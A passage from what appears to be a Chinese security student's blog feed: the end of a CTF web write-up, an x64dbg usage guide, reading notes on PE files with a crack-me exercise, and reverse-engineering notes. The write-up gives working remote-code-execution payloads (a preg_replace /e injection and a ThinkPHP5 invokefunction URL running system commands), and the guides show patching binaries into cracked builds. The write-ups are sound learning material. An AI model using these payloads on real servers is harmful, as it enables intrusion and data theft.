<span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">'text'</span>) &gt; <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">'index.php'</span>) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Ok'</span>);<br>    }<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br>    <span class="hljs-keyword">die</span>();<br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="hljs-string">'127.0.0.1'</span>) {<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) {<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其实看完源码可以发现，首先是有字符串的过滤检测的，但是刚好没有php的伪协议，所以很顺利地得到了源码。解题的关键应该是有注释后的那部分代码。</p><p>有一个X-Forward-For的检测，用插件绕过就行或者用BP自己写一下，然后有三个参数：<code>pat,rep,sub</code>，被<code>preg_replace</code>函数调用，可以使用/e参数一段PHP代码，</p><p>payload:<code>?pat=/a/e&amp;rep=system("cat index.php");&amp;sub=a</code>，</p><p>有index.php的回显，说明可行，</p><p>那么继续构造payload：<code>?pat=/a/e&amp;rep=system("ls");&amp;sub=a</code>，</p><p>有回显<code>css index.html index.php js layui logo.png s3chahahaDir start.sh 视图.png</code>，东西大概率在<code>s3chahahahaDir</code>里，进去看看，果然有flag，也是个目录，里面有flag.php。</p><p>构造payload：<code>?pat=/a/e&amp;rep=system("cat s3chahahaDir/flag/flag.php");&amp;sub=a</code></p><p>在源码里出现了flag：cyberpeace{38067f93cbfb9366ec43674ebac38457}</p><h4 id="16-PHP-RCE"><a href="#16-PHP-RCE" class="headerlink" title="16_PHP_RCE"></a>16_PHP_RCE</h4><h5 id="描述-14"><a href="#描述-14" class="headerlink" title="描述"></a>描述</h5><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/php_rce_1.jpg" class=""><h5 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h5><ul><li>ThinkPHP 漏洞之一：ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。</li><li>shell：<code>find / -name flag</code></li></ul><h5 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h5><p>第一次遇见ThinkPHP，去Github查阅一下POC，得到如下payload：</p><p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code></p><p>得到如下回显：</p><p><code>favicon.ico index.php robots.txt router.php static static</code>，不太像有flag的样子，不过检验一下漏洞是否可以利用。</p><p>接着构造<code>ls /</code>，发现根目录下有flag，cat出来，解决。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x64dbg基础使用指南</title>
    <link href="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<p>x64dbg基础使用指南</p><span id="more"></span><h2 id="x64dbg的基本使用指南"><a href="#x64dbg的基本使用指南" class="headerlink" title="x64dbg的基本使用指南"></a>x64dbg的基本使用指南</h2><p>本篇是为了配合读书笔记，因为原书使用的都是32位的程序，但是目前都是x86-64的机器，所以就学习一下x64dbg。</p><p>在52的帖子里看到的一句话，现在还理解不透彻：<strong>破解的关键在于找到关键CALL</strong></p><p>本文参考文章：<a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1393075">1</a>，<a href="https://www.cnblogs.com/meowv/p/11428772.html">2</a></p><p>X64dbg更新很快，但作者对于帮助文档却惜墨如金，有很多实用的强大功能，都需要自己去摸索。<br>刚才提到寻找关键CALL，IDA虽然F5生成伪码功能强大，并且可以生成函数调用图，但对于复杂的调用看起来就很不直观。并且IDA只能单个文件静态分析，对于跨模块调用就无能为力。</p><h3 id="符号文件"><a href="#符号文件" class="headerlink" title="符号文件"></a>符号文件</h3><h4 id="什么是符号文件-pdb"><a href="#什么是符号文件-pdb" class="headerlink" title="什么是符号文件.pdb"></a>什么是符号文件.pdb</h4><p>​符号文件（Symbol Files）是一个数据信息文件。 它包含了应用程序二进制文件（比如：EXE、DLL等）调试信息，专门用来作调试之用，最终生成的可执行文件在运行时并不需要这个符号文件，但<strong>你的程序中所有的变量信息都记录在这个文件中。 所以调试应用程序时，这个文件是非常重要的</strong>。</p><h4 id="设置符号文件保存路径"><a href="#设置符号文件保存路径" class="headerlink" title="设置符号文件保存路径"></a>设置符号文件保存路径</h4><p>​符号文件通常很大，所以x64dbg自身不带有符号文件，需要自己手动下载和保存，但是默认设置相对路径不太方便，如果下载过符号文件，就会在同一文件夹下生成symbols文件夹，这样在x64dbg升级或者更换的时候非常不方便，所以自己新建一个专门的比较好</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-35-39.png" class=""><p>在选项中，杂项，设置本地符号路径</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-38-21.png" class=""><h4 id="使用符号文件"><a href="#使用符号文件" class="headerlink" title="使用符号文件"></a>使用符号文件</h4><p>很多情况下，x64dbg不会自动加载符号文件，大概率是防止同时加载过多导致程序崩溃，这时候就需要我们手动加载了</p><p>首先需要下载符号文件，打开符号页面，右键.dll，可以发现有下载选项，点击下载即可，但是由于是默认加载微软的符号服务器，所以建议打开代理下载😋</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-44-43.png" class=""><p>这里也可以选择下载所有dll的符号，下载到我们之前设置的文件夹下😁</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-48-49.png" class=""><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>通常打开一个程序的界面分为4块：</p><p>反汇编，寄存器，内存，系统栈</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-55-47.png" class=""><p>关于调试按钮，就自己看咯，在左上角那里，应该比较好理解的</p><h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><p>搜索字符串：右键汇编代码区，搜索，选择搜索模块，选择搜索内容，单步运行到这里搜索当前模块的字符串内容结果，当然这个感觉没有IDA的好用😁，所以我一般是两个一起看</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-59-28.png" class=""><p>双击就可以到字符串在反汇编处</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_11-03-29.png" class=""><h4 id="编辑字符串"><a href="#编辑字符串" class="headerlink" title="编辑字符串"></a>编辑字符串</h4><p>下面学习如何修改字符串常量，首先在反汇编窗口定位到字符串位置，然后在该句信息的窗口双击虚拟内存地址，会x64dbg在内存窗口自动给你跳转到对应位置，</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-49-32.png" class=""><p>用鼠标选中需要编辑的位置，右键打开二进制编辑器</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-54-15.png" class=""><p>可以发现如果没有修改到原字符串的大小，是不会覆盖的，</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-56-18.png" class=""><p>关于这里为什么能在反汇编中动态改变，是因为反汇编区域默认是将在内存中内容读取并解析成相关的汇编代码</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-10-08.png" class=""><h4 id="一些配置"><a href="#一些配置" class="headerlink" title="一些配置"></a>一些配置</h4><p>在选项中，会有一些配置更改的设置，现在我们来看一看</p><ul><li>事件：就是x64dbg自动暂停的事件，这里也解释了我在阅读笔记1中的疑问，为什么会自动暂停，因为我之前安装的时候勾选了系统断点🤣，这里我们改回去，只保留在入口断点暂停</li></ul><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-40-13.png" class=""><ul><li>对于引擎和异常保持默认即可</li><li>反汇编：我这里仅修改了图中三处</li></ul><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-44-13.png" class=""><ul><li>杂项：可以将搜索引擎改为百度：<a href="https://www.baidu.com/s?wd=@topic">https://www.baidu.com/s?wd=@topic</a>  遇到不认识的函数选中，右键，符号名称帮助，直接进行查询。</li></ul><h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><p>在帮助里面</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-48-38.png" class=""><h4 id="显示指令提示"><a href="#显示指令提示" class="headerlink" title="显示指令提示"></a>显示指令提示</h4><p>右键反汇编区，选择显示提示或隐藏</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-49-50.png" class=""><h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><p>右键汇编区代码，然后选择补丁，修补文件即可发布crack版本，注意不要和源文件重名，快捷键Ctrl+P</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_15-06-36.png" class=""><p>可以发现已经修改了字符串</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_15-08-34.png" class="">]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔1</title>
    <link href="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/"/>
    <url>/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔1"><a href="#0Day安全软件漏洞分析第2版阅读随笔1" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔1"></a>0Day安全软件漏洞分析第2版阅读随笔1</h1><p>《0Day安全软件漏洞分析第2版》，浅浅阅读了几章</p><span id="more"></span><h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章-基础知识"></a>第一章-基础知识</h2><h3 id="一些常识"><a href="#一些常识" class="headerlink" title="一些常识"></a>一些常识</h3><h4 id="公布漏洞的权威机构"><a href="#公布漏洞的权威机构" class="headerlink" title="公布漏洞的权威机构"></a>公布漏洞的权威机构</h4><p>（1） <a href="http://cve.mitre.org/">CVE (Common Vulnerabilities and Exposures)</a> 截至目前，这里收录了两万多个漏洞。CVE 会对每个公布的漏洞进行编号、审查。CVE 编号通常也是引用漏洞的标准方式。 </p><p>（2）<a href="http://www.cert.org/">CERT(Computer Emergency Response Team)</a> 计算机应急响应组往往会在第一时间跟进当前的严重漏洞，包括描述信息、POC 的发布链接、厂商的安全响应进度、 用户应该采取的临时性防范措施等。</p><h4 id="何为0Day"><a href="#何为0Day" class="headerlink" title="何为0Day"></a>何为0Day</h4><p>​        微软每个月第二周的星期二发布补丁，这一天通常被称为<code>Black Tuesday</code>，因为会有许多攻击者通宵达旦地去研究这些补丁 patch 了哪些漏洞，并写出 exploit。因为在补丁刚刚发布的一段时 间内，并非所有用户都能及时修复，故这种新公布的漏洞也有一定利用价值。有时把攻击这种 刚刚被 patch 过的漏洞称为 1 day 攻击（patch 发布后1天，叫做1day，5天叫做 5day，未发 patch 统称 0 day）</p><h4 id="必备工具"><a href="#必备工具" class="headerlink" title="必备工具"></a>必备工具</h4><h5 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h5><p>Ollydbg 是一个集成了反汇编分析、十六进制编辑、动态调试等多种功能于一身的功能强大的调试器。</p><p>但是仅支持动态调试32位的系统。</p><h5 id="IDAPro"><a href="#IDAPro" class="headerlink" title="IDAPro"></a>IDAPro</h5><p>IDA 好像是一张二进制的地图，通过它的标注功能可以迅速掌握大量汇编代码的架构，不至于在繁杂的二进制迷宫中迷失方向。目前版本的 IDA 甚至可以用图形方式显示出一个函数内部的执行流程。</p><h5 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h5><p>通过这款调试工具用户可以分析64位的应用，这是OllyDbg所不能做到的，它只能分析32位应用，所以想要分析64位应用，x64dbg是一款专门用于分析64位应用的调试软件。</p><h5 id="二进制编辑器"><a href="#二进制编辑器" class="headerlink" title="二进制编辑器"></a>二进制编辑器</h5><p>比较著名的十六进制编辑器包括 UltraEdit、Hex Workshop 和 WinHex 和 010 editor</p><h3 id="二进制文件概述"><a href="#二进制文件概述" class="headerlink" title="二进制文件概述"></a>二进制文件概述</h3><h4 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h4><p>​     <strong>PE，是<code>Portable Executable</code>的缩写，是<code>Win32</code>平台下可执行文件所遵守的数据格式。像<code>.exe</code>、<code>.dll</code>都是典型的PE文件。在文件执行时，操作系统会按照PE文件格式的约定去相应的地方调用资源，然后装入内存的不同区域。</strong></p><p>PE文件格式将可执行文件分为了几个数据节，一个典型的分节：</p><ul><li>.text: 由编译器产生，存放二进制的机器码，也是我们反汇编和调试的对象。</li><li>.data: 初始化的数据块，如宏定义、全局变量、静态变量等</li><li>.idata: 动态链接库等外来函数的信息</li><li>.rsrc: 程序资源，如图标、菜单等、</li></ul><p><strong>但我们需要注意的是，节可以被任意命名，并且代码的任意部分可以编译到PE的任意节中，如果可执行文件经过了“加壳”处理，PE 的节信息就会变得非常“古怪”。 在 Crack 和反病毒分析中需要经常处理这类古怪的 PE 文件。</strong></p><h4 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h4><p>在内核状态下，我们才能看到并调试物理内存。所以用户态下，我们用调试器看到的都是虚拟内存。Windows让所有的程序都认为自己拥有独立的4GB的内存，这当然是不可能的哈哈的😁</p><p>如下图展示：</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-25_22-21-19.png" class=""><p>这里书中有个比喻非常精妙：</p><ul><li>内存管理机制就像银行</li><li>进程=用户</li><li>内存管理器=银行</li><li>物理内存=现金</li><li>虚拟内存=存款</li><li>当进程（用户）需要使用物理内存（现金）的时候，它就会向银行（内存管理器）申请将虚拟内存（存款）映射为物理内存。</li></ul><h4 id="PE文件与虚拟内存间的映射"><a href="#PE文件与虚拟内存间的映射" class="headerlink" title="PE文件与虚拟内存间的映射"></a>PE文件与虚拟内存间的映射</h4><p>​        在静态调试中，我们看到的某个指令的位置，它是当前函数调用相对于磁盘文件得到的，也就是文件偏移。我们还需要知道这条指令在内存中的位置，即虚拟内存地址。</p><ul><li><strong>文件偏移地址</strong>：数据在PE文件中相对于文件开头的地址，<strong>这里的意思就是文件没有运行的时候</strong>。</li><li><strong>装载基址</strong>：PE装入内存时的基地址。默认情况下，EXE 文件在虚拟内存中的基地址是 0x00400000，DLL 文件是 0x10000000。这些位置可以通过修改编译选项更改。</li><li><strong>虚拟内存地址</strong>：PE文件中机制被装入内存后的地址。</li><li><strong>相对虚拟地址</strong>：内存地址相对于映射基址的偏移量。</li><li><strong>相对虚拟地址=虚拟内存地址-装载基址</strong></li></ul><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-25_22-58-02.png" class=""><p>​        <strong>操作系统在装载时基本上不会破坏程序的各种数据结构，所以文件地址和相对虚拟地址有很大的一致性，但是存在存放基本单位的差别。</strong></p><ul><li>文件数据按0x200字节为基本单位进行组织，PE数据节的大小始终是0x200的整数倍</li><li>内存数据按0x1000字节为基本单位进行组织，内存数据节的大小始终是0x1000的整数倍</li><li>这种由文件单位引起的<strong>节基址差</strong>称作节偏移，所以<strong>文件偏移地址=虚拟内存地址-装载基址-节地址差</strong></li></ul><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_13-32-23.png" class=""><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_13-32-38.png" class=""><h3 id="crack-me1"><a href="#crack-me1" class="headerlink" title="crack_me1"></a>crack_me1</h3><p>实验代码来源于原书</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">"1234567"</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>{ <br>    <span class="hljs-type">int</span> authenticated; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-keyword">return</span> authenticated; <br>} <br><br>main() <br>{ <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) <br>    { <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"please input password: "</span>); <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>,password); <br>        valid_flag = verify_password(password); <br>        <span class="hljs-keyword">if</span>(valid_flag) <br>        { <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"incorrect password!\n\n"</span>); <br>        } <br>        <span class="hljs-keyword">else</span> <br>        { <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congratulation! You have passed the verification!\n"</span>); <br>            <span class="hljs-keyword">break</span>; <br>        } <br>    } <br>}<br></code></pre></td></tr></table></figure><p>使用命令<code>gcc -o crack_me.exe test.c</code>编译为64位的exe文件，当然如果你不是<code>x86-64</code>架构，那么命令有所变化，需要编为32位的程序😋。</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-35-25.png" class=""><p>接下来，使用IDA查看文件结构，这个时候假装我们不知道代码是自己写的😁</p><p>可以看到如下的文件结构：</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-37-10.png" class=""><p><strong>这里普及一下：红色的线表示if语句为真，绿色的线表示if语句结果为假</strong></p><p>然后可以发现，我们需要得到<code>Congratulation!</code>，那么用鼠标选中这条线，按空格切换到汇编代码：</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-41-37.png" class=""><p>使用了一个<code>jz</code>指令，这里我们需要知道这条指令由状态标志寄存器的ZF位决定，为1则跳转</p><p>ZF表示结果运算是否为0，如果为0则置1，反之置0。</p><p>所以这里我只需要让ZF=1即可</p><p>将程序拖进x64dbg里，然后程序会自动运行，这里读者不知道为什么会自动中断😂，这里直接继续运行</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-46-55.png" class=""><p>到需要我们输入密码即可，这里我们需要寻找之前分析出来的判断位置，然后下断点，修改标志位即可破解成功！</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-49-19.png" class=""><p>我们可以通过调用堆栈窗口，查看crack_me.exe的调用，然后查找出来位置，然后在即将跳转的那个指令处打下断点，可以发现这里<code>x64gbd</code>汇编出来是<code>je</code>指令，笔者这里还不清楚为什么会这样😭。当然这里效果和jz是一样，破解方法不变。</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-51-51.png" class=""><p>然后在terminal里输入密码，就会在断点处停下，在视图右侧会显示当前CPU的一些寄存器的状态，修改ZF=1再单步调试到输出即可。</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-55-57.png" class=""><p>破解成功！原密码为1234567</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-59-46.png" class=""><p>第一章学习完毕！</p><p>之前有些基础，所以觉得不难，但是还是觉得这本书太适合入门了，写的很清晰明了的😍</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大二暑期某乙方厂实习纪实</title>
    <link href="/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/"/>
    <url>/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d53c0db07403a54b1b80bc967c746666f5acef46ac7a865bbfcaed709188dd1c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>实习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>与Re的初次邂逅</title>
    <link href="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/"/>
    <url>/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/</url>
    
    <content type="html"><![CDATA[<h2 id="与Re的初次邂逅😱"><a href="#与Re的初次邂逅😱" class="headerlink" title="与Re的初次邂逅😱"></a>与Re的初次邂逅😱</h2><span id="more"></span><h3 id="记录一些IDA的操作"><a href="#记录一些IDA的操作" class="headerlink" title="记录一些IDA的操作"></a>记录一些IDA的操作</h3><p>因为第一次做逆向题，所以IDA也不怎么会用😭，所以浅浅记录下</p><ul><li>IDA有两个版本：一个是打开32位程序的，一个是打开64位程序的，一定要用对，否则不能查看反汇编的代码</li><li>快捷键：<code>shift+F12</code>打开字符串预览，<code>F5</code>打开反汇编代码，<code>n</code>重命名函数或者变量，<code>/</code>是对该行添加注释</li></ul><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/1.jpg" class=""><h3 id="ctfshow-re2"><a href="#ctfshow-re2" class="headerlink" title="ctfshow-re2"></a>ctfshow-re2</h3><p>是个32位的程序，用IDA打开，首先打开<code>strings</code>快速检索信息：</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-28-39.png" 